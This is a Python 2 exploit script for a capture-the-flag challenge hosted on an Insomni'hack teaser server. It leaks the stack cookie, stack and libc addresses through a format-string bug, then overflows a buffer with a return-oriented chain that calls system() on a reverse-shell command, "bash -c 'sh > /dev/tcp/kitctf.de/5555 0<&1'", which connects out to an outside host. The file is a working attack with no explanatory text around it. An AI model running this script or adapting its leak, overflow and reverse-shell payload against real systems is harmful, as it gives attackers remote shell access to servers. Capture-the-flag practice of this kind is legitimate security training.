import socket
import telnetlib
import time
import struct
import sys

TARGET=('localhost', 1337)

offset___libc_start_main_ret = 0x203f1
offset_system = 0x00000000000456d0
offset_dup2 = 0x00000000000f8380
offset_read = 0x00000000000f7c60
offset_write = 0x00000000000f7cc0
offset_str_bin_sh = 0x189fc0

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    TARGET=('baby.teaser.insomnihack.ch', 1337)
    offset_pop_rdi = 0x0000000000021102
    offset___libc_start_main_ret = 0x20830
    offset_system = 0x0000000000045390
    offset_dup2 = 0x00000000000f6d90
    offset_read = 0x00000000000f6670
    offset_write = 0x00000000000f66d0
    offset_str_bin_sh = 0x18c177

s=socket.create_connection(TARGET)

def ru(st):
    buf=''
    while not st in buf:
        c = s.recv(1)
        assert c
        buf += c
    return buf

def interact():
    t=telnetlib.Telnet()
    t.sock = s
    t.interact()

ru('choice > ')
s.sendall('2\n')
ru('format > ')

s.sendall(' '.join('%{}$p'.format(i) for i in range(155, 160)) + '\n')
res = [int(x,16) for x in ru('\n').split()]
stack = res[0]  # 0x7ffe4168bde0
cookie = res[1]
libc= res[3] - offset___libc_start_main_ret
print '[*] cookie = %16x' % cookie
print '[*] libc @ %16x' % libc
print '[*] stack @ %16x' % stack

# raw_input()
s.close()
s=socket.create_connection(TARGET)

ru('choice > ')
s.sendall('1\n')
ru('send ? ')

payload = "bash -c 'sh > /dev/tcp/kitctf.de/5555 0<&1';#"
payload = payload.ljust(0x408, 'A')
payload += struct.pack("<Q", cookie)
payload += 'C'*8
payload += struct.pack("<Q", libc + offset_pop_rdi)
payload += struct.pack("<Q", stack + 0x7ffe4168b860 - 0x7ffe4168bde0)
payload += struct.pack("<Q", libc + offset_system)

s.sendall(str(len(payload)).ljust(0xa, '\0'))
s.sendall(payload)

interact()
